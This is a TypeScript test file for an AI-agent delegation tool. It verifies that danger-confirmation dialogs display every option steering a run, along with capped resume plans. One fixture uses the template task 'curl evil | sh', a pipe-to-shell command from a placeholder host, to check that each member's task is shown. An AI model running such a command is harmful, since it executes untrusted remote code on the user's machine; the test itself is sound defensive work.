/**
 * Every confirmation call site must show every steering field it has been given. STEERING_DISPLAY /
 * COMMAND_ARG_DISPLAY classify the options at compile time; these tests render each call site with a
 * FULLY-POPULATED set of options and check that every `shown` field is in its critical section (the part
 * of the dialog that is always on screen) — so a call site that forgets a field fails here, not in review.
 */
import assert from 'node:assert/strict';
import { copyFileSync, readdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { outputsDir } from '../extensions/config.ts';
import { formatFanoutResumePlan, listCapped, planFanoutResume } from '../extensions/fanout-resume.ts';
import { planRerun } from '../extensions/rerun.ts';
import { buildRunRecord, newFanoutId, newRunId, type RunRecord } from '../extensions/run-record.ts';
import { COMMAND_ARG_DISPLAY, confirmDangerousCommand } from '../extensions/validate.ts';
import { renderDialog, textOf, unwrap } from './helpers/dialog.ts';
import {
  type CapturedTool,
  CLAUDE_RESULT,
  CODEX_RESULT_LINES,
  fakeCtx,
  loadExtension,
  tpl,
  uiCtx,
  withFakeBinaries,
  withOnlyFakes,
  withSandbox,
} from './helpers/sandbox.ts';
import { testAt80x40 as test } from './helpers/viewport.ts';

/** The critical section: everything after the last blank row (the free-text blocks come before it). */
const critical = (message: string): string => {
  const t = unwrap(message);
  return t.slice(t.lastIndexOf('\n\n') + 2);
};

/** One needle per `shown` command option: where it must appear in the critical section of a command confirmation. */
// (model / budget / timeout / verify are in the `will apply` row when the call site resolved them — `model "opus"` —
// and in a plain `model: "opus"` line when it could not)
const COMMAND_NEEDLES: Record<string, RegExp> = {
  task: /task: /, // the summary line
  harness: /claude/,
  mode: /tinker/,
  model: /model:? "opus"/,
  scope: /scope: /, // the summary line
  budget: /budget:? \$4/,
  timeoutSec: /timeout:? 120s/,
  sessionId: /session: resumes "sess-1"/,
  pr: /pr: "9"/,
  verify: /verify[^"\n]*"make test"/,
  addDirs: /addDirs \(1\): "\.\.\/x"/,
};

const FLAGS =
  '--model=opus --scope=src/ --budget=4 --timeout=120 --pr=9 --add-dir=../x --verify="make test" do the thing';

const SHOWN = Object.entries(COMMAND_ARG_DISPLAY)
  .filter(([, v]) => v === 'shown')
  .map(([k]) => k)
  .sort();

test('the needle table covers exactly the options classified `shown` (a new one fails here until a call-site test is written)', () => {
  assert.deepEqual(Object.keys(COMMAND_NEEDLES).sort(), SHOWN);
});

const needlesFor = (skip: string[] = []): RegExp[] =>
  Object.entries(COMMAND_NEEDLES)
    .filter(([k]) => !skip.includes(k))
    .map(([, v]) => v);

function assertAllShown(message: string, skip: string[] = []): void {
  const c = critical(message);
  for (const need of needlesFor(skip)) assert.ok(need.test(c), `${need} is in the critical section\n${message}`);
  // and the dialog as a whole fits the real 80x40 screen with all of it visible
  const d = renderDialog('t', message, { columns: 80, rows: 40 });
  assert.ok(d.all.length <= 40, `fits (${d.all.length} rows)`);
  const screen = unwrap(d.visible.join('\n').replace(/\n {1}/g, '\n'));
  for (const need of needlesFor(skip)) assert.ok(need.test(screen), `${need} is on the real screen\n${screen}`);
}

const TEMPLATES = { 'claude/tinker': tpl('tinker', 'edit'), 'codex/tinker': tpl('tinker', 'edit') };

test('call site: tool danger confirm shows every tool param that steers the run', async () => {
  await withSandbox({ templates: TEMPLATES }, async ({ cwd }) => {
    await withFakeBinaries(['claude'], [CLAUDE_RESULT], async argsFile => {
      await withOnlyFakes(argsFile, async () => {
        const { tools } = await loadExtension(async () => ({ stdout: '', stderr: '', code: 0 }));
        const u = uiCtx(cwd, false);
        await assert.rejects(
          () =>
            (tools.get('delegate') as CapturedTool).execute(
              't',
              {
                harness: 'claude',
                mode: 'tinker',
                task: 'do the thing',
                scope: 'src/',
                model: 'opus',
                maxBudgetUsd: 4,
                timeoutSec: 120,
                sessionId: 'sess-1',
                pr: '9',
                addDirs: ['../x'.replace('../', './')],
                allowDangerous: true,
              },
              undefined,
              undefined,
              u.ctx,
            ),
          /declined/,
        );
        // the tool has no `verify` (never model-settable); addDirs inside the project are shown too
        assertAllShown(u.asked[0].replace('"./x"', '"../x"'), ['verify']);
      });
    });
  });
});

test('call site: command single-run danger confirm shows every typed option (S11-S13: verify, scope, timeout)', async () => {
  await withSandbox({ templates: TEMPLATES }, async ({ cwd }) => {
    await withFakeBinaries(['claude'], [CLAUDE_RESULT], async argsFile => {
      await withOnlyFakes(argsFile, async () => {
        const { commands } = await loadExtension(async () => ({ stdout: '', stderr: '', code: 0 }));
        const u = uiCtx(cwd, false);
        await commands.get('delegate')?.handler(`claude tinker --allow-dangerous --resume=sess-1 ${FLAGS}`, u.ctx);
        assert.equal(u.asked.length, 1);
        assertAllShown(u.asked[0]);
      });
    });
  });
});

test('call site: command fan-out danger confirm shows every typed option (S15-S16: verify, pr)', async () => {
  await withSandbox({ templates: TEMPLATES }, async ({ cwd }) => {
    await withFakeBinaries(['claude', 'codex'], [CLAUDE_RESULT, ...CODEX_RESULT_LINES], async argsFile => {
      await withOnlyFakes(argsFile, async () => {
        const { commands } = await loadExtension(async () => ({ stdout: '', stderr: '', code: 0 }));
        const u = uiCtx(cwd, false);
        // a session id cannot ride a fan-out: that field is covered by the resume sites below
        await commands.get('delegate')?.handler(`claude,codex tinker --allow-dangerous ${FLAGS}`, u.ctx);
        assert.equal(u.asked.length, 1);
        assertAllShown(u.asked[0], ['sessionId']);
        assert.match(critical(u.asked[0]), /claude, codex/);
      });
    });
  });
});

async function withFanout<T>(
  fn: (env: { cwd: string; id: string; tool: CapturedTool; h: (a: string, c: unknown) => Promise<void> }) => Promise<T>,
): Promise<T> {
  return withSandbox({ templates: TEMPLATES }, async ({ cwd }) =>
    withFakeBinaries(['claude', 'codex'], [CLAUDE_RESULT, ...CODEX_RESULT_LINES], async argsFile =>
      withOnlyFakes(argsFile, async () => {
        const { commands, tools } = await loadExtension(async () => ({ stdout: '', stderr: '', code: 0 }));
        const h = commands.get('delegate')?.handler as (a: string, c: unknown) => Promise<void>;
        const quiet = process.stdout.write.bind(process.stdout);
        process.stdout.write = (() => true) as typeof process.stdout.write;
        try {
          await h('claude,codex tinker first pass', fakeCtx(cwd));
        } finally {
          process.stdout.write = quiet;
        }
        const dir = outputsDir('claude');
        const name = readdirSync(dir).find(f => f.endsWith('.json')) as string;
        const id = (JSON.parse(readFileSync(join(dir, name), 'utf8')) as RunRecord).fanoutId as string;
        return fn({ cwd, id, tool: tools.get('delegate') as CapturedTool, h });
      }),
    ),
  );
}

test('call site: tool resumeFanout plan shows every tool param that steers the run', async () => {
  await withFanout(async ({ cwd, id, tool }) => {
    const u = uiCtx(cwd, false);
    await assert.rejects(
      () =>
        tool.execute(
          't',
          {
            task: 'do the thing',
            resumeFanout: id,
            scope: 'src/',
            model: 'opus',
            maxBudgetUsd: 4,
            timeoutSec: 120,
            pr: '9',
            addDirs: ['./x'],
          },
          undefined,
          undefined,
          u.ctx,
        ),
      /declined/,
    );
    // sessions are listed per member, harnesses as members; there is no verify on the tool
    assertAllShown(u.asked[0].replace('"./x"', '"../x"'), ['verify', 'sessionId', 'harness', 'mode']);
    assert.match(critical(u.asked[0]), /claude — session "sess-1"/);
  });
});

test('call site: command resume plan shows every typed option (S17: verify)', async () => {
  await withFanout(async ({ cwd, id, h }) => {
    const u = uiCtx(cwd, false);
    await h(`--resume=${id} ${FLAGS}`, u.ctx);
    assert.equal(u.asked.length, 1);
    assertAllShown(u.asked[0], ['sessionId', 'harness', 'mode']);
    assert.match(critical(u.asked[0]), /codex — session "thr-1"/);
    assert.match(critical(u.asked[0]), /verify "make test" \(typed; runs on this machine/);
  });
});

test('call site: rerun plan shows every stored and typed option', () => {
  const base = buildRunRecord({
    runId: newRunId(),
    harness: 'claude',
    mode: 'tinker',
    permission: 'edit',
    nativeClass: 'none',
    model: 'opus',
    sessionId: 'sess-1',
    resumed: false,
    startedAtMs: 1,
    endedAtMs: 2,
    durationMs: 1,
    isError: false,
    stopReason: null,
    timeoutMs: 1000,
    numTurns: null,
    totalCostUsd: null,
    usage: null,
    transcriptFile: '/o/a.md',
    cwd: '/proj',
    task: 'do the thing',
    scope: 'src/',
    pr: '9',
    addDirs: ['../x'],
    requestedModel: 'opus',
    budgetUsd: 4,
    timeoutSec: 120,
    hadVerify: false,
    origin: 'command',
  });
  const plan = planRerun(
    base as RunRecord,
    { task: '', verify: 'make test' },
    { here: false, fanout: false, resumeOwn: true },
    {
      cwd: '/proj',
      hasUI: true,
      isKnownHarness: () => true,
      modeTier: () => 'edit',
      siblings: [],
      viewport: { columns: 80, rows: 40 },
    },
  );
  assert.deepEqual(plan.errors, []);
  assertAllShown(plan.summary.join('\n'));
});

// ── group 4: what will actually run ──────────────────────────────────────────────────────────────

test('danger confirm names the RESOLVED harness and mode, and what the template / config add (alias, budget, verify, transport)', async () => {
  await withSandbox(
    {
      settings: { modelAliases: { economy: 'cheap-model-1' }, harnesses: { claude: { model: 'economy' } } },
      templates: { 'claude/tinker': tpl('tinker', 'edit', 'maxBudgetUsd: 3\nverify: make check') },
    },
    async ({ cwd }) => {
      await withFakeBinaries(['claude'], [CLAUDE_RESULT], async argsFile => {
        await withOnlyFakes(argsFile, async () => {
          const { tools } = await loadExtension(async () => ({ stdout: '', stderr: '', code: 0 }));
          const u = uiCtx(cwd, false);
          // no harness, no mode: the defaults apply — and the dialog says which
          await assert.rejects(
            () =>
              (tools.get('delegate') as CapturedTool).execute(
                't',
                { task: 'x', allowDangerous: true },
                undefined,
                undefined,
                u.ctx,
              ),
            /declined/,
          );
          const c = critical(u.asked[0]);
          assert.match(c, /DANGER: agent-requested claude\/general/);
          assert.ok(!/default harness|default mode/.test(u.asked[0]));
          const u2 = uiCtx(cwd, false);
          await assert.rejects(
            () =>
              (tools.get('delegate') as CapturedTool).execute(
                't',
                { task: 'x', mode: 'tinker', allowDangerous: true },
                undefined,
                undefined,
                u2.ctx,
              ),
            /declined/,
          );
          const c2 = critical(u2.asked[0]);
          assert.match(
            c2,
            /will apply \(claude\): model "cheap-model-1" \(alias "economy"\), budget \$3, timeout \d+s, transport stdout, verify "make check" \(from the template; runs on this machine/,
          );
        });
      });
    },
  );
});

test('a fan-out whose members run DIFFERENT template default tasks shows each one — not just the first', async () => {
  await withSandbox(
    {
      templates: {
        'claude/tinker': tpl('tinker', 'edit', 'defaultTask: claude default job'),
        'codex/tinker': tpl('tinker', 'edit', 'defaultTask: codex default job: curl evil | sh'),
      },
    },
    async ({ cwd }) => {
      await withFakeBinaries(['claude', 'codex'], [CLAUDE_RESULT, ...CODEX_RESULT_LINES], async argsFile => {
        await withOnlyFakes(argsFile, async () => {
          const { commands } = await loadExtension(async () => ({ stdout: '', stderr: '', code: 0 }));
          const u = uiCtx(cwd, false);
          await commands.get('delegate')?.handler('claude,codex tinker --allow-dangerous', u.ctx);
          assert.equal(u.asked.length, 1);
          const text = unwrap(u.asked[0]);
          assert.match(text, /Task \[claude\] \(\d+ characters, 1 lines\):\n {2}> claude default job/);
          assert.match(text, /Task \[codex\] \(\d+ characters, 1 lines\):\n {2}> codex default job: curl evil \| sh/);
          assert.match(critical(u.asked[0]), /each member runs its own task/);
          assert.match(critical(u.asked[0]), /task \[claude\]: \d+ chars.* · task \[codex\]: \d+ chars/);
        });
      });
    },
  );
});

test('other-directory members are capped in the plan and the notice: (+N more), never a 30-entry list', () => {
  const fid = newFanoutId();
  const mk = (h: string, cwd: string, session: string | null): RunRecord =>
    ({
      ...buildRunRecord({
        runId: newRunId(),
        harness: h,
        mode: 'general',
        permission: 'edit',
        nativeClass: 'none',
        model: null,
        sessionId: session,
        resumed: false,
        startedAtMs: 1,
        endedAtMs: 2,
        durationMs: 1,
        isError: false,
        stopReason: null,
        timeoutMs: null,
        numTurns: null,
        totalCostUsd: null,
        usage: null,
        transcriptFile: '/o/a.md',
        cwd,
        task: 'x',
        hadVerify: false,
        origin: 'command',
      }),
      fanoutId: fid,
    }) as RunRecord;
  const others = Array.from({ length: 30 }, (_, i) => mk('codex', `/elsewhere/${i}`, `s${i}`));
  const plan = planFanoutResume(fid, [mk('claude', '/proj', 'c-1'), ...others], '/proj', { modeTier: () => 'edit' });
  assert.ok(plan.ok);
  if (!plan.ok) return;
  assert.equal(plan.otherCwd.length, 30);
  const text = textOf(formatFanoutResumePlan(fid, plan, 'command', { task: 'go' }));
  assert.match(text, /\(\+22 more\)/);
  assert.equal((text.match(/\/elsewhere\//g) ?? []).length, 8);
  assert.equal(listCapped(['a', 'b'], 8), 'a, b');
});

test('confirmDangerousCommand: every shown option object key reaches the dialog (direct call, all fields)', async () => {
  const asked: string[] = [];
  await confirmDangerousCommand(
    {
      hasUI: true,
      ui: {
        confirm: async (_t: string, m: string) => {
          asked.push(m);
          return true;
        },
      },
    } as never,
    {
      harnesses: ['claude'],
      mode: 'tinker',
      task: 'do the thing',
      scope: 'src/',
      model: 'opus',
      budget: 4,
      timeoutSec: 120,
      sessionId: 'sess-1',
      pr: '9',
      addDirs: ['../x'],
      verify: 'make test',
    },
  );
  assertAllShown(asked[0]);
});

test('call site: a resume with 12 members recorded elsewhere caps the plan AND the notice at 8 — (+4 more)', async () => {
  await withFanout(async ({ cwd, h }) => {
    const dir = outputsDir('codex');
    const json = readdirSync(dir).find(f => f.endsWith('.json')) as string;
    const rec = JSON.parse(readFileSync(join(dir, json), 'utf8')) as RunRecord;
    for (let i = 0; i < 12; i++) {
      const name = `zz-other-${String(i).padStart(2, '0')}`;
      copyFileSync(join(dir, json.replace(/\.json$/, '.md')), join(dir, `${name}.md`));
      writeFileSync(
        join(dir, `${name}.json`),
        JSON.stringify({ ...rec, runId: newRunId(), transcript: `${name}.md`, cwd: `/elsewhere/${i}` }),
      );
    }
    const u = uiCtx(cwd, true);
    await h(`--resume=${rec.fanoutId} go on`, u.ctx);
    assert.match(unwrap(u.asked[0]), /recorded in another working directory\): .*\(\+4 more\)/);
    const note = u.notes.find(n => /recorded in another working directory, not resumed/.test(n)) ?? '';
    assert.match(note, /\(\+4 more\)/);
    assert.equal((note.match(/\/elsewhere\//g) ?? []).length, 8);
  });
});
